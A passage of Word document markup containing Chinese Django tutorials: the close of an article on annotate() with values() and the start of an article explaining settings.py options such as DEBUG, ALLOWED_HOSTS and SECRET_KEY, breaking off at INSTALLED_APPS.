    <w:p w14:paraId="5FBADF73" w14:textId="5EF5D9E0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Annotate与values()联用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3883CC" w14:textId="18B4507A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们在前例中按学生对象进行分组，我们同样可以按学生姓名name来进行分组。唯一区别是本例中，如果两个学生具有相同名字，那么他们的爱好数量将叠加。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662528A3" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按学生名字分组，统计每个学生的爱好数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABE1369" w14:textId="58801396" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.values('name').annotate(Count('hobbies'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FB8C1E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你还可以使用values方法从annotate返回的数据集里提取你所需要的字段，如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153B472C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按学生名字分组，统计每个学生的爱好数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ED3F5F" w14:textId="0AC42DA1" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.annotate(hobby_count=Count('hobbies')).values('name', 'hobby_count')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54915CC5" w14:textId="61AED23C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2196702A" w14:textId="6F4914C6" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的aggregate和annotate方法属于高级查询方法，主要用于组合查询，可以大大提升数据库查询效率。当你需要对查询集(queryset)的某些字段进行聚合操作时(比如Sum, Avg, Max)，请使用aggregate方法。如果你想要对数据集先进行分组(Group By)然后再进行某些聚合操作或排序时，请使用annotate方法。最后希望本文提供的一些示例对你有所帮助哦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2359CB35" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C20FF0D" w14:textId="29664752" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.11.27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CD88BF" w14:textId="53CAE26A" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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sidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>049</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId288" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(25)：settings.py设置选项深入解读。大江狗精品原创。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1680ED7A"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Django基础(25)：settings.py设置选项深入解读。大江狗精品原创。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2315D8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId289" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2019-03-02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C09E5F9" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C84783" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345BAE8E" w14:textId="3D9ACFC6" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大家有没有碰到过这样的一个令人熟悉的场景？有一天你花了很长时间读到了一篇文章，学习到了很多新的知识和技巧，顿时发现自己进步了，感到非常开心。小编我今天就打算送给大家这样一篇文章，让你对Django的settings.py文件有个全新的理解，喜欢的就留言点赞吧。妹子图照发，祝大家天天好心情。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C445255" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>settings.py的默认设定与工作原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA789E4" w14:textId="14F05B7E" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django设置文件settings.py包含的选项非常多，但好消息是大部分不需要我们手动去设置。当我们使用django-admin.py startproject xxx命令创建一个Django项目时，你会发现生成的settings.py已经包含了部分基本的默认设定，我们只需要修改和添加我们需要使用的设定就好了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB35498" w14:textId="64F38124" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个项目完整的全局默认设置在django/conf/global_settings.py文件中。Django在编译时，会先载入global_settings.py中的全局默认配置值，然后加载用户指定的settings文件，重写部分全局默认设置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA6178A" w14:textId="700FC56B" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>下面我们就来看看一些常用设置选项及它们背后的含义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE1CD52" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BASE_DIR </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480B0CFA" w14:textId="5D073C34" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>默认值os.path.dirname(os.path.dirname(os.path.abspath(__file__)))。这个是Django项目文件夹所在目录得绝对路径，一般不要修改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFDA7DD" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DEBUG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF669B7" w14:textId="2A2B0E63" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>默认值是True。在本地开发测试环境下设置DEBUG=True可以显示bug信息，便于开发者找出代码错误所在。当你在部署项目在生产环境时，请切记设置DEBUG=False。因为生成环境下打开Debug会暴露很多敏感设置信息（比如数据库密码)。注意: 当你设置DEBUG=False, 你一定要设置ALLOWED_HOSTS选项, 否则会抛出异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044255AB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ALLOWED_HOSTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDD3FD5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>默认值为空[]。设置ALLOWED_HOSTS是为了限定用户请求中的host值，以防止黑客构造包来进行头部攻击。该选项正确设置方式如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E6CFDA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DEBUG=True:  ALLOWED_HOSTS可以为空，也可设置为['127.0.0.01', 'localhost']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C0D99A" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DEBUG=False: ALLOWED_HOSTS=['46.124.78.xx', 'www.bat.com'，'127.0.0.1']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B68C902" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DF3FFF6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你关闭DEBUG时，HOST一般为服务器公网IP或者注册域名。 当你还需要使用子域名时，你可以用'.bat.com'。它将匹配bat.com, www.bat.com和news.bat.com。在正式部署项目时，请尽量不要设置ALLOWED_HOSTS=['*']。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AF369E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40CF125B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SECRET_KEY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6300076C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SECRET_KEY是Django根据自己算法生成的一大串随机数，本质是个加密盐，用于防止CSRF（Cross-site request forgery）跨站请求伪造攻击。当部署Django项目到生产环境中时，Django文档建议不直接在settings.py里输入字符串，而是采取下面两种方法读取SECRET_KEY。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E41044D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 方法一: 从环境变量中读取SECRET_KEY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDF4B1F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E960065" w14:textId="63F2A8F8" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SECRET_KEY = os.environ['SECRET_KEY']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B54B7C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 方法二: 从服务器上Django项目文件价外的某个文件读取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA19388" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>with open('/etc/secret_key.txt') as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13299653" w14:textId="0C1B3A8B" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    SECRET_KEY = f.read().strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D78AAB2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59393F83" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04465E0F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
